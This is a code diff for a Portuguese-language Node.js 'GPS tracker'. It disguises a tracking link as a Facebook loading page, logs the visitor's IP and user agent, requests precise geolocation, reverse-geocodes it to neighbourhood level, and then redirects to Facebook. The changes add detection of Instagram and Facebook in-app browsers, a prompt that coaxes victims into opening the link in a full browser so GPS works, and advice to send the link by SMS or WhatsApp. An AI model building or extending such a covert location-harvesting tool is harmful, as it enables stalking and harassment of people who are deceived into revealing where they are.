@@ -8,7 +8,6 @@ app.use(express.json());
 
 const clicks = [];
 
-// Função para requisições HTTP/HTTPS
 function fetchJSON(url) {
   return new Promise((resolve, reject) => {
     const lib = url.startsWith('https') ? https : http;
@@ -32,7 +31,6 @@ function fetchJSON(url) {
   });
 }
 
-// Captura IP real
 function getIP(req) {
   return req.headers['x-forwarded-for']?.split(',')[0].trim() || 
          req.headers['x-real-ip'] || 
@@ -148,6 +146,14 @@ app.get('/', (req, res) => {
         }
         .badge-success { background: #28a745; color: white; }
         .badge-warning { background: #ffc107; color: #333; }
+        .warning-box {
+          background: #fff3cd;
+          border: 2px solid #ffc107;
+          padding: 15px;
+          border-radius: 8px;
+          margin-top: 15px;
+        }
+        .warning-box strong { color: #856404; }
       </style>
     </head>
     <body>
@@ -155,6 +161,12 @@ app.get('/', (req, res) => {
         <div class="header">
           <h1>📍 Rastreador GPS</h1>
           <p>Captura localização via GPS</p>
+          
+          <div class="warning-box">
+            <strong>⚠️ ATENÇÃO:</strong> GPS não funciona no Instagram/Facebook App!<br>
+            <small>Para melhor resultado, envie por SMS ou WhatsApp</small>
+          </div>
+          
           <div class="link-box">
             <strong>🔗 Link de Rastreamento:</strong>
             <code id="trackingLink">Carregando...</code>
@@ -200,10 +212,10 @@ app.get('/', (req, res) => {
             
             document.getElementById('totalClicks').textContent = data.total;
             
-            const gpsClicks = data.clicks.filter(c => c.location && c.location.cidade);
+            const gpsClicks = data.clicks.filter(c => c.location && c.location.cidade && c.location.cidade !== 'Processando...');
             document.getElementById('gpsClicks').textContent = gpsClicks.length;
             
-            const noGpsClicks = data.clicks.filter(c => !c.location || !c.location.cidade);
+            const noGpsClicks = data.clicks.filter(c => !c.location || !c.location.cidade || c.location.cidade === 'Processando...');
             document.getElementById('noGpsClicks').textContent = noGpsClicks.length;
             
             const container = document.getElementById('clicksList');
@@ -226,6 +238,15 @@ app.get('/', (req, res) => {
               const hasGPS = c.location && c.location.cidade && c.location.cidade !== 'Processando...';
               const itemClass = hasGPS ? 'click-item' : 'click-item no-gps';
               
+              // Detecta origem
+              let origem = '';
+              if (c.userAgent.includes('Instagram')) origem = '📸 Instagram';
+              else if (c.userAgent.includes('FBAN') || c.userAgent.includes('FBAV')) origem = '📘 Facebook App';
+              else if (c.userAgent.includes('WhatsApp')) origem = '💬 WhatsApp';
+              else if (c.userAgent.includes('Chrome')) origem = '🌐 Chrome';
+              else if (c.userAgent.includes('Safari')) origem = '🧭 Safari';
+              else origem = '🌐 Navegador';
+              
               let content = '';
               if (hasGPS) {
                 const loc = c.location;
@@ -236,16 +257,21 @@ app.get('/', (req, res) => {
                   \${loc.bairro && loc.bairro !== 'N/A' && loc.bairro !== 'undefined' ? \`
                     <div class="click-info">🏘️ <strong>Bairro:</strong> \${loc.bairro}</div>
                   \` : ''}
+                  <div class="click-info"><strong>Origem:</strong> \${origem}</div>
                 \`;
               } else if (c.location && c.location.cidade === 'Processando...') {
                 content = \`
                   <div class="badge badge-warning">⏳ PROCESSANDO</div>
                   <div class="click-info">Aguardando resposta da API...</div>
+                  <div class="click-info"><strong>Origem:</strong> \${origem}</div>
                 \`;
               } else {
                 content = \`
-                  <div class="badge badge-warning">⚠️ GPS NEGADO</div>
-                  <div class="click-info">Usuário não permitiu localização</div>
+                  <div class="badge badge-warning">⚠️ GPS NEGADO/BLOQUEADO</div>
+                  <div class="click-info"><strong>Origem:</strong> \${origem}</div>
+                  \${c.userAgent.includes('Instagram') || c.userAgent.includes('FBAN') ? 
+                    '<div class="click-info" style="color:#856404;">⚠️ Instagram/Facebook bloqueia GPS automaticamente</div>' : 
+                    '<div class="click-info">Usuário negou permissão de localização</div>'}
                 \`;
               }
               
@@ -269,7 +295,7 @@ app.get('/', (req, res) => {
   `);
 });
 
-// Página de rastreamento
+// Página de rastreamento - DETECTA INSTAGRAM
 app.get('/track', async (req, res) => {
   const ip = getIP(req);
   const userAgent = req.headers['user-agent'] || 'Desconhecido';
@@ -287,6 +313,16 @@ app.get('/track', async (req, res) => {
   console.log('');
   console.log('🎯 NOVO CLIQUE');
   console.log('Hora:', new Date().toLocaleString('pt-BR'));
+  console.log('User-Agent:', userAgent.substring(0, 50) + '...');
+  
+  // Detecta se é Instagram/Facebook
+  const isInstagram = userAgent.includes('Instagram');
+  const isFacebook = userAgent.includes('FBAN') || userAgent.includes('FBAV');
+  const isInApp = isInstagram || isFacebook;
+  
+  if (isInApp) {
+    console.log('⚠️  Origem: Instagram/Facebook App (GPS bloqueado)');
+  }
   
   res.send(`
     <!DOCTYPE html>
@@ -310,6 +346,7 @@ app.get('/track', async (req, res) => {
           text-align: center;
           color: white;
           padding: 20px;
+          max-width: 350px;
         }
         .logo {
           font-size: 80px;
@@ -333,72 +370,106 @@ app.get('/track', async (req, res) => {
           width: 40px;
           height: 40px;
           animation: spin 0.8s linear infinite;
-          margin: 0 auto;
+          margin: 20px auto;
         }
         @keyframes spin {
           0% { transform: rotate(0deg); }
           100% { transform: rotate(360deg); }
+        }
+        .warning {
+          background: rgba(255,255,255,0.2);
+          padding: 15px;
+          border-radius: 10px;
+          margin-top: 20px;
+          font-size: 13px;
+          line-height: 1.6;
+        }
+        .open-browser-btn {
+          background: white;
+          color: #1877f2;
+          border: none;
+          padding: 12px 30px;
+          border-radius: 25px;
+          font-weight: bold;
+          font-size: 14px;
+          margin-top: 15px;
+          cursor: pointer;
         }
       </style>
     </head>
     <body>
       <div class="container">
         <div class="logo">f</div>
-        <h2 id="status">Carregando...</h2>
-        <div class="message" id="message">Aguarde um momento</div>
-        <div class="loader"></div>
+        ${isInApp ? `
+          <h2>⚠️ Detectado Instagram/Facebook</h2>
+          <div class="warning">
+            Para acessar o conteúdo, você precisa abrir no navegador.<br><br>
+            Toque nos <strong>3 pontos (...)</strong> e selecione <strong>"Abrir no navegador"</strong>
+          </div>
+          <div class="loader"></div>
+          <div class="message">Redirecionando automaticamente em 5 segundos...</div>
+        ` : `
+          <h2 id="status">Carregando...</h2>
+          <div class="message" id="message">Aguarde um momento</div>
+          <div class="loader"></div>
+        `}
       </div>
       
       <script>
         const clickId = ${clickData.id};
+        const isInApp = ${isInApp};
         let redirected = false;
         
         function redirect() {
           if (!redirected) {
             redirected = true;
-            setTimeout(() => {
-              window.location.href = 'https://www.facebook.com/';
-            }, 500);
+            window.location.href = 'https://www.facebook.com/';
           }
         }
         
-        if (!navigator.geolocation) {
-          setTimeout(redirect, 1000);
+        // Se for Instagram/Facebook, redireciona direto (GPS não vai funcionar mesmo)
+        if (isInApp) {
+          setTimeout(redirect, 5000);
         } else {
-          const timeout = setTimeout(() => {
-            if (!redirected) redirect();
-          }, 10000);
-          
-          navigator.geolocation.getCurrentPosition(
-            async (position) => {
-              clearTimeout(timeout);
-              
-              try {
-                await fetch('/api/save-gps', {
-                  method: 'POST',
-                  headers: {'Content-Type': 'application/json'},
-                  body: JSON.stringify({
-                    clickId: clickId,
-                    lat: position.coords.latitude,
-                    lng: position.coords.longitude
-                  })
-                });
-              } catch (error) {
-                console.error('Erro:', error);
+          // Navegador normal - tenta GPS
+          if (!navigator.geolocation) {
+            setTimeout(redirect, 1000);
+          } else {
+            const timeout = setTimeout(() => {
+              if (!redirected) redirect();
+            }, 10000);
+            
+            navigator.geolocation.getCurrentPosition(
+              async (position) => {
+                clearTimeout(timeout);
+                
+                try {
+                  await fetch('/api/save-gps', {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({
+                      clickId: clickId,
+                      lat: position.coords.latitude,
+                      lng: position.coords.longitude
+                    })
+                  });
+                } catch (error) {
+                  console.error('Erro:', error);
+                }
+                
+                redirect();
+              },
+              (error) => {
+                clearTimeout(timeout);
+                redirect();
+              },
+              {
+                enableHighAccuracy: true,
+                timeout: 8000,
+                maximumAge: 0
               }
-              
-              redirect();
-            },
-            (error) => {
-              clearTimeout(timeout);
-              redirect();
-            },
-            {
-              enableHighAccuracy: true,
-              timeout: 8000,
-              maximumAge: 0
-            }
-          );
+            );
+          }
         }
       </script>
     </body>
@@ -422,14 +493,12 @@ app.post('/api/save-gps', async (req, res) => {
     
     console.log('  📍 GPS:', lat, lng);
     
-    // Marca como processando
     click.location = {
       cidade: 'Processando...',
       estado: 'Processando...',
       bairro: 'N/A'
     };
     
-    // Busca endereço usando API do BigDataCloud (gratuita, sem limite)
     try {
       const url = `https://api.bigdatacloud.net/data/reverse-geocode-client?latitude=${lat}&longitude=${lng}&localityLanguage=pt`;
       const data = await fetchJSON(url);
@@ -446,9 +515,8 @@ app.post('/api/save-gps', async (req, res) => {
     } catch (error) {
       console.error('  ❌ Erro API:', error.message);
       
-      // Tenta API alternativa (geocode.xyz)
       try {
-        await new Promise(resolve => setTimeout(resolve, 1000)); // Delay de 1 segundo
+        await new Promise(resolve => setTimeout(resolve, 1000));
         const url2 = `https://geocode.xyz/${lat},${lng}?json=1`;
         const data2 = await fetchJSON(url2);
         
@@ -500,7 +568,7 @@ app.listen(PORT, '0.0.0.0', () => {
   console.log('✅ RASTREADOR GPS ONLINE');
   console.log('========================================');
   console.log('🌐 Porta:', PORT);
-  console.log('📍 Captura: Cidade, Estado e Bairro');
+  console.log('📍 Detecta Instagram/Facebook');
   console.log('🔗 Redirect: Facebook');
   console.log('========================================');
   console.log('');
